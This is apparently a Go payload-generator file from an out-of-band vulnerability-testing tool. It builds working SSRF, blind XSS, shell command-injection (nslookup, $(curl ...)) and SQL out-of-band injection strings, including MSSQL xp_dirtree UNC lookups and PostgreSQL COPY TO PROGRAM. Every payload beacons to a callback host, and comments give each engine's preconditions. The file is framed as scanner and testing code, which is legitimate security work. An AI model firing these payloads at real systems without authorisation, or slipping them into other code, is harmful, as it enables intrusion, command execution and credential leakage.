package oob

// payload.go: pure payload GENERATORS. Every function here is a method on
// Interaction that returns a slice of concrete injection strings, each one
// embedding this interaction's callback Domain / URL / Token so that an inbound
// Hit can be correlated straight back to the probe.
//
// This file is DATA ONLY. It never executes a shell, opens a socket, or touches
// a target. The injection tool decides where to place these strings; the
// collaborator's listeners record the resulting callbacks. Keeping generation
// separate from execution is what makes these payloads safe to unit-test.

// SSRFTargets returns values to drop into URL-shaped request parameters (e.g.
// ?url=, ?next=, ?image=, webhook fields). A server-side fetch of any of these
// resolves Domain (DNS) and, for the http forms, also beacons the path (HTTP) —
// either channel proves the SSRF. Variants cover schemes and host-confusion
// tricks that still force a DNS resolution of Domain even when the fetch is
// filtered.
func (in Interaction) SSRFTargets() []string {
	d := in.Domain
	return dedupe([]string{
		// Plain HTTP/HTTPS fetch — proves SSRF over both DNS and the HTTP beacon.
		in.URL, // e.g. http://<tok>.<base>/<tok>
		"https://" + d + "/" + in.Token,
		// Scheme-relative: many client libs inherit the page scheme and still fetch.
		"//" + d + "/" + in.Token,
		// Bare host (no scheme/path): forces a DNS lookup of Domain at minimum.
		d,
		// Userinfo/@-confusion: parsers that split on '@' may still resolve Domain.
		"http://" + d + "@127.0.0.1/" + in.Token,
		// Gopher/file-ish schemes some fetchers honor — still triggers DNS on Domain.
		"gopher://" + d + "/_" + in.Token,
	})
}

// BlindXSS returns HTML/JS payloads that, when stored and later rendered in a
// victim/admin browser, fetch the callback. Arrival of the HTTP/DNS hit proves
// the markup executed in a real context. Each form targets a different sink
// (raw HTML, attribute, scriptable error handler, inline script).
func (in Interaction) BlindXSS() []string {
	d := in.Domain
	return dedupe([]string{
		// External script include: simplest, runs on parse.
		`<script src="//` + d + `"></script>`,
		// Broken image whose onerror beacons the callback host.
		`<img src=x onerror="this.src='//` + d + `'">`,
		// SVG onload variant for contexts that strip <script>/<img>.
		`<svg onload="(new Image).src='//` + d + `'">`,
		// Inline fetch() to the full callback URL (path-correlated).
		`<script>fetch('` + in.URL + `')</script>`,
	})
}

// CmdInjection returns shell-metacharacter payloads meant to be appended to a
// parameter that flows into a system() / exec'd command line. Each forces an
// nslookup/curl of Domain/URL, so a DNS or HTTP hit confirms code execution.
// The set spans separators that work across *nix shells and Windows cmd.exe
// (nslookup exists on both; curl ships with modern Windows 10+ and most *nix).
func (in Interaction) CmdInjection() []string {
	d := in.Domain
	return dedupe([]string{
		// Statement separator (POSIX sh + cmd.exe both honor ';' loosely / '&').
		";nslookup " + d + ";",
		// Backtick command substitution (*nix sh/bash).
		"`nslookup " + d + "`",
		// $() command substitution running curl against the full URL (*nix).
		"$(curl -s " + in.URL + ")",
		// Pipe: stdin of nslookup ignored, but the command still runs (sh + cmd).
		"| nslookup " + d,
		// AND-chain: runs after a successful prior command (sh + cmd.exe).
		"&& nslookup " + d,
	})
}

// SQLiOOB returns database out-of-band exfil payloads that coerce the DB engine
// itself to perform a network lookup of Domain — the classic path when query
// output is blind but the server can reach a resolver. Each line is commented
// with the engine it targets and its precondition.
func (in Interaction) SQLiOOB() []string {
	d := in.Domain
	return dedupe([]string{
		// MySQL/MariaDB: LOAD_FILE on a UNC path makes Windows resolve+SMB-connect
		// Domain. Precondition: MySQL on Windows, FILE priv, secure_file_priv unset.
		"' UNION SELECT LOAD_FILE('\\\\\\\\" + d + "\\\\x')-- -",
		// MSSQL: xp_dirtree against a UNC path forces SMB auth -> DNS+NTLM to Domain.
		// Precondition: sysadmin/xp_dirtree reachable, outbound 445/DNS allowed.
		"'; EXEC master..xp_dirtree '\\\\" + d + "\\x';-- -",
		// Oracle: UTL_INADDR.get_host_address resolves Domain (DNS exfil).
		// Precondition: pre-11g or ACL granting network access to the schema.
		"' AND 1=UTL_INADDR.GET_HOST_ADDRESS('" + d + "')-- -",
		// Oracle alt: UTL_HTTP makes an outbound HTTP request to the callback URL.
		// Precondition: UTL_HTTP execute priv + network ACL.
		"' AND 1=(SELECT UTL_HTTP.REQUEST('" + in.URL + "') FROM dual)-- -",
		// PostgreSQL: COPY ... FROM PROGRAM runs a shell that nslookups Domain.
		// Precondition: superuser (or pg_execute_server_program), >=9.3.
		"'; COPY (SELECT '') TO PROGRAM 'nslookup " + d + "';-- -",
	})
}

// dedupe returns ss with duplicate strings removed, preserving first-seen order.
// Generators run it so each payload set is guaranteed duplicate-free (asserted
// by the tests).
func dedupe(ss []string) []string {
	seen := make(map[string]struct{}, len(ss))
	out := ss[:0:0]
	for _, s := range ss {
		if _, ok := seen[s]; ok {
			continue
		}
		seen[s] = struct{}{}
		out = append(out, s)
	}
	return out
}
